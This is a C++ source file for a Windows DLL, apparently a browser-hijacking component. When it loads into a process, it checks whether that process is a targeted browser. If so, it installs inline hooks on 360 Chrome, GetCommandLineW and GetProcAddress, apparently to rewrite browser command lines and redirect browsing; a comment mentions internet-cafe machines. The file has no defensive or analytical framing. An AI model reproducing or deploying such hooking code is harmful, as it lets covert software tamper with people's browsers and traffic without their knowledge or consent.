#include "CMDRedirect.h"

#include "custom_360chrome.h"

#include "FakeCommandLine.h"
#include "FakeGetProcAddress.h"
#include "FakeWinHttpGetIEProxyConfigForCurrentUser.h"

#include "HookControl\InlineHook.h"
#include "CommonControl\Commonfun.h"
#include "..\common\common_fundadores.h"

#pragma  comment(lib,DIRECTORY_LIB_INTERNAL "HookControl.lib")
#pragma  comment(lib,DIRECTORY_LIB_INTERNAL "CommonControl.lib")

__declspec(dllexport) void _()
{

}

namespace Global {
	CDebug Log(_T("CMD_Redirect"));
	__pfnGetCommandLineW pfnGetCommandLineW = NULL;
}

BOOL WINAPI Fundadores(const wchar_t * pszParam) {
	return Common::Fundadores_(pszParam);
}

DWORD WINAPI StartBusiness_Thread(void *)
{
	void * pBusinessData = NULL;

	if (false == Common::GetBufferToShareMap(_T("GLOBAL_LINGPAO8_ENCODE_BUSINESS_DATA"), (void**)&pBusinessData))
	{
		HookControl::UnInlineHook(GetProcAddress(LoadLibrary(_T("Kernel32.dll")), "GetCommandLineW"), Global::pfnGetCommandLineW);
		Global::Log.PrintA(LOGOutputsA, "[% 5u] CMD StartBusiness failed: %u", GetCurrentProcessId(), ::GetLastError());
		return -1;
	}

	//bIsOK = Hook::StartCommandLineHook();
	//Global::Log.PrintA(LOGOutputs, "[% 5u] CMD StartCommandLineHook Is: %u", GetCurrentProcessId(), bIsOK);

	return 0;
}

DWORD WINAPI StartBusiness(void *)
{
	DWORD dwThreadId = 0;

	LockCurrentModule();
	PRTL_USER_PROCESS_PARAMETERS pProcessParameters = GetCurrentProcessParameters();

	if (NULL == pProcessParameters) {
		return false;
	}

	if (true == IsRedirectWebBrowser(pProcessParameters->ImagePathName.Buffer) && NULL == Global::pfnGetCommandLineW) {
		Hook::Start360ChromeHook();
		Hook::StartCommandLineHook();
		Hook::StartGetProcAddressHook();
		//Hook::StartWinHttpGetIEProxyConfigForCurrentUserHook();
	}
	//CloseHandle(CreateThread(NULL, 0, StartBusiness_Thread, NULL, 0, &dwThreadId)); //会导致某些网吧的chrome 打不开 版本 48.0.2564.116

	return dwThreadId;
}

BOOL APIENTRY DllMain(_In_ HINSTANCE hDllHandle, _In_ DWORD dwReason, _In_opt_ void * _Reserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		StartBusiness(NULL);
		break;
	case DLL_PROCESS_DETACH:
		break;
	default:
		LockCurrentModule();
		break;
	}

	return TRUE;
}